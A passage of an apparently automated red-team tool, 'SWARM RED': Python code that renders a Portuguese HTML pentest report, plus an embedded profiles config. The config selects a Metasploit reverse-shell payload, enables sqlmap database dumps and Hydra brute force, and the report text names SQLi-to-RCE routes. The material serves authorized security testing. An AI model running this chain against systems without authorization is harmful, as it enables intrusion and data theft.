        target=target, profile=profile, version=version, now=now,
        total=total, success=success, st=st, tf=tf, rs=rs, rl_=rl_, rc_=rc_,
        pl=pl, sqli_vc=sqli_vc, msf_sess=msf_sess, total_endpoints=total_endpoints,
        findings=findings, sqli_results=sqli_results, msf_log=msf_log,
        hydra_results=hydra_results, nikto_findings=nikto_findings,
        cves=cves, services=services, log_content=log_content,
        zap_hc=zap_hc, ssd=ssd, outdir=outdir
    )

    report_path = f"{outdir}/relatorio_swarm_red.html"
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    return report_path


def _build_html(**k) -> str:
    """Constrói o HTML completo do relatório."""
    CSS = """
body{font-family:'Segoe UI',Arial,sans-serif;margin:0;padding:20px;background:#f0f2f5}
.ctn{max-width:1200px;margin:0 auto;background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,.1)}
.hdr{background:#1a3a4f;color:#fff;padding:40px 30px;text-align:center}
.hdr h1{margin:0 0 5px;font-size:1.6em;letter-spacing:2px;text-transform:uppercase}
.hdr .sub{font-size:1.1em;opacity:.9;margin:5px 0}.hdr .meta{font-size:.85em;opacity:.7}
.hdr .cls{display:inline-block;border:2px solid #e74c3c;color:#e74c3c;padding:4px 16px;border-radius:4px;font-weight:700;font-size:.8em;margin-top:12px;letter-spacing:1px}
.cnt{padding:30px}
h2{color:#1a3a4f;border-bottom:2px solid #e0e0e0;padding-bottom:8px;margin-top:30px}
h3{color:#2c3e50;margin-top:20px}
.sts{display:flex;gap:12px;margin:20px 0;flex-wrap:wrap}
.sc{flex:1;padding:18px;text-align:center;color:#fff;border-radius:8px;min-width:85px}
.sc .n{font-size:32px;font-weight:bold}.sc .l{font-size:.75em;text-transform:uppercase;letter-spacing:.5px;opacity:.9}
.s-cr{background:#7a2e2e}.s-hi{background:#b34e4e}.s-me{background:#d4833a}.s-lo{background:#4a7c8c}.s-in{background:#6e8f72}.s-te{background:#2c3e50}
.ib{background:#e8f4f8;padding:15px 20px;border-radius:8px;margin:15px 0;border-left:4px solid #1a3a4f}
.ib.n{border-left-color:#2c3e50;background:#f9f9f9}.ib.g{border-left-color:#27ae60;background:#f0faf4}
table{width:100%;border-collapse:collapse;margin:10px 0}
th,td{border:1px solid #ddd;padding:10px;text-align:left;vertical-align:top}
th{background:#f5f5f5;font-weight:600;font-size:.85em}
.fd{border:1px solid #ddd;margin:18px 0;padding:20px;border-radius:8px;background:#fafafa}
.fd.Critical{border-left:10px solid #7a2e2e}.fd.High{border-left:10px solid #b34e4e}.fd.Medium{border-left:10px solid #d4833a}.fd.Low{border-left:10px solid #4a7c8c}
.fd h3{margin-top:0}
.sb{display:inline-block;padding:3px 10px;border-radius:4px;font-size:.75em;font-weight:700;color:#fff}
.sb-cr{background:#7a2e2e}.sb-hi{background:#b34e4e}.sb-me{background:#d4833a}.sb-lo{background:#4a7c8c}.sb-in{background:#6e8f72}
.tb{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.7em;font-weight:700;margin-left:6px;color:#fff}
.t-sq{background:#e67e22}.t-ms{background:#2980b9}.t-hy{background:#8e44ad}.t-nk{background:#27ae60}
.ev{background:#2d3436;color:#dfe6e9;padding:14px;border-radius:6px;font-family:'Cascadia Code',monospace;font-size:.82em;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:400px;margin:8px 0;line-height:1.5}
.rb{background:#e0e0e0;border-radius:4px;height:14px;margin:8px 0}.ri{height:14px;border-radius:4px}
code{background:#f4f4f4;padding:1px 4px;border-radius:3px;font-size:.85em}
.ft{background:#f5f5f5;padding:20px;text-align:center;font-size:.8em;color:#666}
.toc{background:#f8f9fa;padding:15px 20px;border-radius:8px;margin:15px 0}.toc a{color:#1a3a4f;text-decoration:none}.toc a:hover{text-decoration:underline}.toc li{margin:4px 0}
.pt{display:inline-block;background:#1a3a4f;color:#fff;padding:2px 8px;border-radius:3px;font-size:.7em;margin-right:6px}
.tl{border-left:3px solid #1a3a4f;margin:15px 0;padding:0}
.ti{padding:10px 20px;position:relative;margin-left:15px}
.ti::before{content:'';position:absolute;left:-24px;top:15px;width:12px;height:12px;border-radius:50%;background:#1a3a4f}
.ti.ok::before{background:#27ae60}.ti.no::before{background:#95a5a6}
.cnt-badge{background:#555;color:#fff;padding:2px 10px;border-radius:10px;font-size:.7em;font-weight:700}
.ep-list{background:#f8f9fa;border:1px solid #e0e0e0;border-radius:6px;padding:10px 14px;margin:8px 0;font-size:.85em;max-height:200px;overflow-y:auto}
.ep-list li{margin:2px 0;font-family:monospace;font-size:.9em}
"""

    h = f"""<!DOCTYPE html><html lang="pt-br"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>SWARM RED — {esc(k['target'])}</title><style>{CSS}</style></head><body><div class="ctn">
<div class="hdr"><h1>SWARM RED — Red Team Engagement Report</h1>
<div class="sub">{esc(k['target'])}</div>
<div class="meta">Data: {k['now']} | Perfil: {k['profile'].upper()} ({k['pl'].get(k['profile'],k['profile'])}) | v{k['version']}</div>
<div class="cls">CONFIDENCIAL — RED TEAM — DISTRIBUIÇÃO RESTRITA</div></div><div class="cnt">
<div class="toc"><strong>Índice</strong><ol>
<li><a href="#s1">Sumário Executivo</a></li><li><a href="#s2">Escopo e Metodologia</a></li>
<li><a href="#s3">Narrativa de Ataque</a></li><li><a href="#s4">Superfície de Ataque</a></li>
<li><a href="#s5">Achados e Vulnerabilidades</a></li><li><a href="#s6">Recomendações</a></li>
<li><a href="#s7">Conclusão</a></li><li><a href="#s8">Apêndices</a></li></ol></div>"""

    # Section 1: Executive Summary
    h += _section_exec_summary(**k)
    # Section 2: Scope
    h += _section_scope(**k)
    # Section 3: Narrative
    h += _section_narrative(**k)
    # Section 4: Attack Surface
    h += _section_surface(**k)
    # Section 5: Findings
    h += _section_findings(**k)
    # Section 6: Recommendations
    h += _section_recommendations(**k)
    # Section 7: Conclusion
    h += _section_conclusion(**k)
    # Section 8: Appendix
    h += _section_appendix(**k)

    h += f'</div><div class="ft">SWARM RED v{k["version"]} — Red Team Report | {k["now"]} | <strong>CONFIDENCIAL</strong></div></div></body></html>'
    return h


def _section_exec_summary(**k) -> str:
    h = f"""<h2 id="s1">1. Sumário Executivo</h2>
<div class="sts">
<div class="sc s-te"><div class="n">{k['total']}</div><div class="l">Testes</div></div>
<div class="sc s-cr"><div class="n">{k['st']['Critical']}</div><div class="l">Crítico</div></div>
<div class="sc s-hi"><div class="n">{k['st']['High']}</div><div class="l">Alto</div></div>
<div class="sc s-me"><div class="n">{k['st']['Medium']}</div><div class="l">Médio</div></div>
<div class="sc s-lo"><div class="n">{k['st']['Low']}</div><div class="l">Baixo</div></div>
<div class="sc s-in"><div class="n">{k['st']['Info']}</div><div class="l">Info</div></div></div>
<div class="ib"><p><strong>Risco:</strong> {k['rs']}/100 — <span style="color:{k['rc_']};font-weight:bold">{k['rl_']}</span></p>
<div class="rb"><div class="ri" style="background:{k['rc_']};width:{k['rs']}%"></div></div></div>
<div class="ib n">
<p>O SWARM RED executou um engagement de Red Team contra <strong>{esc(k['target'])}</strong> ({k['pl'].get(k['profile'],k['profile'])}), realizando {k['total']} teste(s).</p>"""
    if k['success'] > 0:
        h += f'\n<p><strong style="color:#7a2e2e">Confirmados {k["success"]} exploit(s)</strong> afetando {k["total_endpoints"]} endpoint(s). Nível técnico: baixo a intermediário.</p>'
    else:
        h += '\n<p>Nenhum exploit confirmado. Os controles resistiram às técnicas aplicadas.</p>'
    if k['findings']:
        h += f'\n<p><strong>{k["tf"]} achado(s)</strong>: {k["st"]["Critical"]} crítico(s), {k["st"]["High"]} alto(s).</p>'
    h += '\n<p>Recomendações na seção 6.</p></div>\n'
    return h


def _section_scope(**k) -> str:
    return f'''<h2 id="s2">2. Escopo e Metodologia</h2>
<div class="ib"><p><strong>Alvo:</strong> <code>{esc(k['target'])}</code> | <strong>Abordagem:</strong> Grey-box | <strong>Metodologia:</strong> PTES + MITRE ATT&CK</p></div>
<table><tr><th>Ferramenta</th><th>Tática MITRE</th><th>Propósito</th></tr>
<tr><td><strong>sqlmap</strong></td><td><span class="pt">T1190</span></td><td>SQL Injection — crawl, forms, robots.txt/sitemap.xml</td></tr>
<tr><td><strong>Metasploit</strong></td><td><span class="pt">T1210</span></td><td>CVE exploitation, scanners, credential testing</td></tr>
<tr><td><strong>Hydra</strong></td><td><span class="pt">T1110</span></td><td>Brute force — SSH, FTP, MySQL, PostgreSQL, RDP, SMB</td></tr>
<tr><td><strong>Nikto</strong></td><td><span class="pt">T1046</span></td><td>Web misconfigurations, default files</td></tr>
<tr><td><strong>SearchSploit</strong></td><td><span class="pt">T1588.005</span></td><td>Exploits públicos para CVEs</td></tr></table>'''


def _section_narrative(**k) -> str:
    h = '<h2 id="s3">3. Narrativa de Ataque</h2><div class="tl">\n'
    h += f'<div class="ti ok"><strong>Fase 1 — Ingestão</strong><br>{len(k["services"])} serviço(s), {len(k["cves"])} CVE(s).</div>\n'
    h += f'<div class="ti {"ok" if k["sqli_vc"]>0 else "no"}"><strong>Fase 2 — SQL Injection</strong><br>'
    if k["sqli_vc"] > 0: h += f'{k["sqli_vc"]} resultado(s) positivo(s).'
    elif k["sqli_results"]: h += f'{len(k["sqli_results"])} testado(s) — nenhum vulnerável.'
    else: h += 'Modo discovery.'
    h += '</div>\n'
    h += f'<div class="ti {"ok" if k["msf_sess"]>0 else "no"}"><strong>Fase 3 — Metasploit</strong><br>'
    if k["msf_sess"] > 0: h += f'{k["msf_sess"]} sessão(ões).'
    elif k["msf_log"]: h += 'Scanners executados.'
    else: h += 'Não executada.'
    h += '</div>\n'
    h += f'<div class="ti {"ok" if k["hydra_results"] else "no"}"><strong>Fase 4 — Brute Force</strong><br>'
    if k["hydra_results"]: h += f'Credenciais em {len(k["hydra_results"])} serviço(s).'
    else: h += 'Sem credenciais fracas.'
    h += '</div>\n'
    h += f'<div class="ti {"ok" if k["nikto_findings"] else "no"}"><strong>Fase 5 — Nikto</strong><br>'
    if k["nikto_findings"]: h += f'{len(k["nikto_findings"])} achado(s).'
    else: h += 'Sem achados.'
    h += '</div>\n'
    h += f'<div class="ti ok"><strong>Fase 6 — Consolidação</strong><br>{len(k["cves"])} CVE(s), {len(k["ssd"])} com exploit(s) público(s).</div>\n</div>\n'
    return h


def _section_surface(**k) -> str:
    h = '<h2 id="s4">4. Superfície de Ataque</h2>\n'
    if k["services"]:
        h += '<table><tr><th>Porta</th><th>Serviço</th><th>Versão</th></tr>\n'
        for s in k["services"]:
            p = s.split()
            h += f'<tr><td><code>{esc(p[0] if p else "?")}</code></td><td>{esc(p[1] if len(p)>1 else "?")}</td><td>{esc(" ".join(p[2:]) if len(p)>2 else "")}</td></tr>\n'
        h += '</table>\n'
    if k["cves"]:
        h += '<h3>CVEs</h3><table><tr><th>CVE</th><th>Exploits Públicos</th></tr>\n'
        for cv in k["cves"]:
            ex = k["ssd"].get(cv, [])
            if ex: h += f'<tr><td><strong style="color:#7a2e2e">{esc(cv)}</strong></td><td>{", ".join(esc(e.get("Title","")[:50]) for e in ex[:3])}</td></tr>\n'
            else: h += f'<tr><td><code>{esc(cv)}</code></td><td style="color:#999">—</td></tr>\n'
        h += '</table>\n'
    return h


def _section_findings(**k) -> str:
    findings = k["findings"]
    h = '<h2 id="s5">5. Achados e Vulnerabilidades</h2>\n'
    if not findings:
        return h + '<div class="ib g"><p><strong>Nenhum exploit confirmado.</strong></p></div>\n'

    total_ep = sum(f.get("count", 1) for f in findings)
    h += f'<div class="ib"><p><strong>{len(findings)} achado(s)</strong> representando {total_ep} endpoint(s).</p></div>\n'

    mitre = {"sqli": "T1190 — Exploit Public-Facing Application", "bruteforce": "T1110 — Brute Force", "exploit": "T1210 — Exploitation of Remote Services"}
    impact = {
        "sqli": "Leitura, modificação ou exclusão de dados no banco. Possível escalação para RCE via xp_cmdshell, INTO OUTFILE ou UDF.",
        "bruteforce": "Acesso não autorizado ao serviço. Possível movimentação lateral.",
        "exploit": "Execução remota de código ou acesso privilegiado."
    }

    for i, f in enumerate(findings, 1):
        sv, tl = f["sev"], f["tool"]
        tc = {"sqlmap": "t-sq", "metasploit": "t-ms", "hydra": "t-hy", "nikto": "t-nk"}.get(tl, "t-sq")
        sc = {"Critical": "sb-cr", "High": "sb-hi", "Medium": "sb-me", "Low": "sb-lo"}.get(sv, "sb-in")
        cnt = f.get("count", 1)
        cnt_html = f' <span class="cnt-badge">{cnt} endpoint{"s" if cnt > 1 else ""}</span>' if cnt > 1 else ""

        h += f'<div class="fd {sv}"><h3>RED-{i:03d}: {esc(f["title"])}{cnt_html} <span class="sb {sc}">{sv.upper()}</span> <span class="tb {tc}">{esc(tl)}</span></h3>\n'
        h += f'<table><tr><th style="width:130px">Alvo</th><td><code>{esc(f["target"][:200])}</code></td></tr>\n'
        h += f'<tr><th>MITRE ATT&CK</th><td>{mitre.get(f["type"], "T1210")}</td></tr>\n'
        h += f'<tr><th>Impacto</th><td>{impact.get(f["type"], "Comprometimento do sistema")}</td></tr></table>\n'

        eps = f.get("endpoints", [])
        if eps and len(eps) > 1:
            h += f'<p><strong>Endpoints afetados ({len(eps)}):</strong></p>\n<div class="ep-list"><ol>\n'
            for ep in eps[:30]:
                h += f'<li>{esc(ep)}</li>\n'
            if len(eps) > 30:
                h += f'<li><em>... e mais {len(eps) - 30}</em></li>\n'
            h += '</ol></div>\n'

        det = f.get("detail", "")
        if det and det.strip():
            h += f'<p><strong>Evidência técnica:</strong></p>\n<div class="ev">{esc(det)}</div>\n'
        h += '</div>\n'

    # Complementary data
    if k["msf_log"]:
        h += '<h3>Log Metasploit</h3>\n<div class="ev">' + esc(k["msf_log"][-2000:]) + '</div>\n'
    if k["nikto_findings"]:
        h += '<h3>Nikto</h3><table><tr><th>Achado</th><th>URL</th></tr>\n'
        for nf in k["nikto_findings"][:30]:
            if isinstance(nf, dict):
                h += f'<tr><td>{esc(nf.get("msg", ""))}</td><td><code>{esc(nf.get("url", ""))}</code></td></tr>\n'
        h += '</table>\n'
    if k["zap_hc"]:
        h += '<h3>OWASP ZAP — High/Critical</h3><table><tr><th>Risco</th><th>Alerta</th><th>URL</th></tr>\n'
        for z in k["zap_hc"]:
            c = "#7a2e2e" if z["risk"] == "Critical" else "#b34e4e"
            h += f'<tr><td><strong style="color:{c}">{esc(z["risk"])}</strong></td><td>{esc(z["alert"])}</td><td><code>{esc(z["url"][:80])}</code></td></tr>\n'
        h += '</table>\n'
    return h


def _section_recommendations(**k) -> str:
    h = '<h2 id="s6">6. Recomendações</h2>\n'
    obs = []
    sqli_vc = k["sqli_vc"]
    if sqli_vc > 0:
        obs.append(("SQL Injection", "Endpoints aceitam input não sanitizado.",
            "1. Prepared statements em TODAS as queries\n2. WAF com regras SQLi\n3. Input validation (whitelist)\n4. Menor privilégio no banco\n5. Code review", "Imediata (0-7 dias)"))
    if k["hydra_results"]:
        obs.append(("Credenciais Fracas", "Senhas padrão ou fracas aceitas.",
            "1. Trocar TODAS as senhas default\n2. Min 14 chars, complexidade, rotação 90d\n3. MFA em serviços expostos\n4. Account lockout (5 tentativas)\n5. Monitoramento SIEM", "Imediata (0-7 dias)"))
    if k["msf_sess"] > 0:
        obs.append(("Exploração Remota", "Exploits conhecidos funcionaram.",
            "1. Patch management completo\n2. Segmentação de rede\n3. EDR/XDR\n4. Hardening de serviços", "Imediata (0-3 dias)"))
    if k["cves"]:
        obs.append(("CVEs Ativos", f"{len(k['cves'])} CVE(s), {len(k['ssd'])} com exploits.",
            "1. Patching prioritário\n2. Vulnerability management contínuo\n3. Compensating controls\n4. Virtual patching via WAF", "Curto prazo (0-30 dias)"))
    if not obs:
        obs.append(("Manutenção", "Controles eficazes.",
            "1. Patching atualizado\n2. Red team trimestral\n3. Expandir escopo", "Contínuo"))

    for title, detail, rec, prazo in obs:
        h += f'<div class="fd Medium"><h3>{esc(title)}</h3><table>\n'
        h += f'<tr><th style="width:130px">Observação</th><td>{esc(detail)}</td></tr>\n'
        h += f'<tr><th>Ações</th><td><pre style="margin:0;background:transparent;border:none;font-size:.9em">{esc(rec)}</pre></td></tr>\n'
        h += f'<tr><th>Prazo</th><td><strong>{esc(prazo)}</strong></td></tr></table></div>\n'
    return h


def _section_conclusion(**k) -> str:
    h = '<h2 id="s7">7. Conclusão</h2><div class="ib n">\n'
    if k["success"] > 0:
        h += f'<p><strong style="color:#7a2e2e">Confirmados {k["success"]} exploit(s)</strong> contra {esc(k["target"])}, afetando {k["total_endpoints"]} endpoint(s). Remediação imediata recomendada.</p>'
    else:
        h += f'<p>Os controles de {esc(k["target"])} resistiram a {k["total"]} teste(s). Expandir escopo em futuros engagements.</p>'
    return h + '</div>\n'


def _section_appendix(**k) -> str:
    h = '<h2 id="s8">8. Apêndices</h2>\n<h3>A. Activity Log</h3>\n<div class="ev">' + esc(k["log_content"]) + '</div>\n'
    h += '<h3>B. Artefatos</h3><table><tr><th>Arquivo</th><th>Descrição</th></tr>\n'
    for fn, ds in [
        ("exploits_confirmed.csv", "Exploits confirmados"), ("cves_found.txt", "CVEs"),
        ("sqli_targets.txt", "URLs SQLi"), ("open_services.txt", "Serviços"),
        ("swarm_red.log", "Log"), ("sqlmap/", "Resultados sqlmap"),
        ("metasploit/swarm_red.rc", "RC Metasploit"), ("hydra/", "Brute force"),
        ("nikto/nikto_report.json", "Nikto"), ("searchsploit/", "SearchSploit"),
    ]:
        ex = "✓" if os.path.exists(f"{k['outdir']}/{fn}") else "—"
        h += f'<tr><td><code>{ex} {esc(fn)}</code></td><td>{esc(ds)}</td></tr>\n'
    h += '</table>\n'
    return h


if __name__ == "__main__":
    if len(sys.argv) < 8:
        print(__doc__)
        sys.exit(1)
    path = generate_report(
        outdir=sys.argv[1], target=sys.argv[2], profile=sys.argv[3],
        total=int(sys.argv[4]), success=int(sys.argv[5]),
        failed=int(sys.argv[6]), version=sys.argv[7]
    )
    print(f"REPORT_OK:{path}")
___EMBEDDED_report_generator_END___
___EMBEDDED_profiles_START___
# ═══════════════════════════════════════════════════════════════
#  SWARM RED — Configuração de Perfis
# ═══════════════════════════════════════════════════════════════
#  Edite este arquivo para ajustar os perfis de execução.
#  Formato: PROFILE_CAMPO[perfil]=valor
# ═══════════════════════════════════════════════════════════════

# ── Descrições ──
PROFILE_DESCRIPTION[staging]="Staging/Homolog — agressividade alta, dump habilitado"
PROFILE_DESCRIPTION[lab]="Lab/Sandbox — sem restrições, ambiente descartável"
PROFILE_DESCRIPTION[production]="Produção (janela aprovada) — mínimo impacto, só confirmação"

# ── sqlmap ──
PROFILE_SQLMAP_LEVEL[staging]=3;   PROFILE_SQLMAP_LEVEL[lab]=5;    PROFILE_SQLMAP_LEVEL[production]=1
PROFILE_SQLMAP_RISK[staging]=2;    PROFILE_SQLMAP_RISK[lab]=3;     PROFILE_SQLMAP_RISK[production]=1
PROFILE_SQLMAP_THREADS[staging]=5; PROFILE_SQLMAP_THREADS[lab]=10; PROFILE_SQLMAP_THREADS[production]=1
PROFILE_SQLMAP_DUMP[staging]=true; PROFILE_SQLMAP_DUMP[lab]=true;  PROFILE_SQLMAP_DUMP[production]=false

# ── Metasploit ──
PROFILE_MSF_PAYLOAD[staging]="generic/shell_reverse_tcp"
PROFILE_MSF_PAYLOAD[lab]="generic/shell_reverse_tcp"
PROFILE_MSF_PAYLOAD[production]="NONE"

# ── Brute Force (Hydra) ──
PROFILE_BRUTE_FORCE[staging]=true;  PROFILE_BRUTE_FORCE[lab]=true;  PROFILE_BRUTE_FORCE[production]=false

# ── Nikto ──
PROFILE_NIKTO_ENABLED[staging]=true; PROFILE_NIKTO_ENABLED[lab]=true; PROFILE_NIKTO_ENABLED[production]=false

# ── Limites ──
PROFILE_MAX_EXPLOITS[staging]=50;  PROFILE_MAX_EXPLOITS[lab]=999;  PROFILE_MAX_EXPLOITS[production]=10

# ── Timeouts (segundos) ──
PROFILE_TIMEOUT_SQLMAP_CRAWL[staging]=900;  PROFILE_TIMEOUT_SQLMAP_CRAWL[lab]=1800; PROFILE_TIMEOUT_SQLMAP_CRAWL[production]=300
PROFILE_TIMEOUT_SQLMAP_URL[staging]=300;    PROFILE_TIMEOUT_SQLMAP_URL[lab]=600;    PROFILE_TIMEOUT_SQLMAP_URL[production]=120
PROFILE_TIMEOUT_MSF[staging]=1800;          PROFILE_TIMEOUT_MSF[lab]=3600;          PROFILE_TIMEOUT_MSF[production]=600
PROFILE_TIMEOUT_HYDRA[staging]=300;         PROFILE_TIMEOUT_HYDRA[lab]=600;         PROFILE_TIMEOUT_HYDRA[production]=120
PROFILE_TIMEOUT_NIKTO[staging]=700;         PROFILE_TIMEOUT_NIKTO[lab]=1200;        PROFILE_TIMEOUT_NIKTO[production]=300
___EMBEDDED_profiles_END___
__SWARM_RED_PAYLOAD_END_7x9k2m__
